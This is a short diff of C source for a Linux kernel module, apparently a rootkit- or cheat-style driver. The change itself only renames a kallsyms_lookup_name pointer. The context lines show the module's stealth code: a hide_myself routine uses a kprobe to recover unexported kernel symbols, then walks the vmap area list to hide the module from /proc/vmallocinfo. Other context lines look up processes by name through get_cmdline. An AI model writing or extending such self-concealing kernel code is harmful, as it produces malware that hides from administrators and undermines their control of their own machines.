@@ -43,7 +43,7 @@ MODULE_PARM_DESC(mCommon, "Parameter");
 
 static struct miscdevice dispatch_misc_device;
 
-unsigned long (*kallsyms_lookup_name)(const char *name);
+unsigned long (*kallsyms_lookup_nameX)(const char *name);
 
 static void __init hide_myself(void)
 {
@@ -58,15 +58,15 @@ static void __init hide_myself(void)
 	printk("driverX: module hide failed");
         return;
     }
-    kallsyms_lookup_name = (unsigned long (*)(const char *name)) kp.addr;
+    kallsyms_lookup_nameX = (unsigned long (*)(const char *name)) kp.addr;
     unregister_kprobe(&kp);
 #endif
 	
    // return;
 	
     _vmap_area_list =
-        (struct list_head *) kallsyms_lookup_name("vmap_area_list");
-    _vmap_area_root = (struct rb_root *) kallsyms_lookup_name("vmap_area_root");
+        (struct list_head *) kallsyms_lookup_nameX("vmap_area_list");
+    _vmap_area_root = (struct rb_root *) kallsyms_lookup_nameX("vmap_area_root");
 
     /* hidden from /proc/vmallocinfo */
     list_for_each_entry_safe (va, vtmp, _vmap_area_list, list) {
@@ -108,7 +108,7 @@ pid_t find_process_by_name(const char *name) {
 	}
     
     if (my_get_cmdline == NULL) {
-        my_get_cmdline = (void *) kallsyms_lookup_name("get_cmdline");
+        my_get_cmdline = (void *) kallsyms_lookup_nameX("get_cmdline");
 		// It can be NULL, because there is a fix below if get_cmdline is NULL
     }
     
